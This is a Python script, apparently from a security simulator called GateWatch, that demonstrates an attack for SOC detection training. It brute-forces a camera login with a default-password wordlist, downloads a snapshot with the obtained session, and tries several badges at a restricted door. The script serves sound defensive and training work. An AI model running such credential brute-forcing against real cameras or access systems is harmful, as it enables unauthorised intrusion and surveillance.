"""Live attack demo against the simulator's interactive services (stdlib only).

1. Brute force on CAM-01 login with a small wordlist.
2. Snapshot download with the stolen session.
3. Badge attempts at the restricted ACS-03 door.

Each request is recorded by the simulator as an `observed_http` event with
this machine's IP. Use only against the GateWatch simulator.
"""
from __future__ import annotations

import argparse
import json
import sys
import time
import urllib.error
import urllib.request

WORDLIST = ["admin", "12345", "password", "admin123", "hikvision", "camera", "root", "Cam3ra!2026"]
BADGES = ["B-00001", "B-13370", "B-10421"]


def request(url: str, method: str = "GET", body: dict | None = None, token: str | None = None):
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(url, data=data, method=method)
    req.add_header("Content-Type", "application/json")
    if token:
        req.add_header("Authorization", f"Bearer {token}")
    try:
        with urllib.request.urlopen(req, timeout=5) as resp:
            return resp.status, json.loads(resp.read() or b"{}")
    except urllib.error.HTTPError as err:
        return err.code, {}


def main() -> int:
    parser = argparse.ArgumentParser(description="GateWatch CAM-01 attack demo")
    parser.add_argument("--target", default="http://127.0.0.1:8001", help="simulator base URL")
    parser.add_argument("--user", default="admin")
    parser.add_argument("--delay", type=float, default=0.3, help="seconds between attempts")
    args = parser.parse_args()
    base = args.target.rstrip("/")

    print(f"[*] Brute force {base}/devices/CAM-01/login as '{args.user}'")
    token = None
    for password in WORDLIST:
        status, body = request(f"{base}/devices/CAM-01/login", "POST",
                               {"username": args.user, "password": password})
        if status == 403:
            print("[!] CAM-01 is isolated by the SOC; stopping.")
            return 2
        print(f"    {password!r:<16} -> {status}")
        if status == 200:
            token = body["session"]
            break
        time.sleep(args.delay)
    if not token:
        print("[-] No password found.")
        return 1

    status, body = request(f"{base}/devices/CAM-01/snapshot", token=token)
    print(f"[*] Snapshot -> {status}" + (f" (captured {body.get('captured_at')})" if status == 200 else ""))

    print("[*] Badge attempts at ACS-03 (restricted door)")
    for badge in BADGES:
        status, body = request(f"{base}/devices/ACS-03/badge", "POST", {"badge_id": badge})
        print(f"    {badge} -> {body.get('result', status)}")
        time.sleep(args.delay)
    return 0


if __name__ == "__main__":
    sys.exit(main())
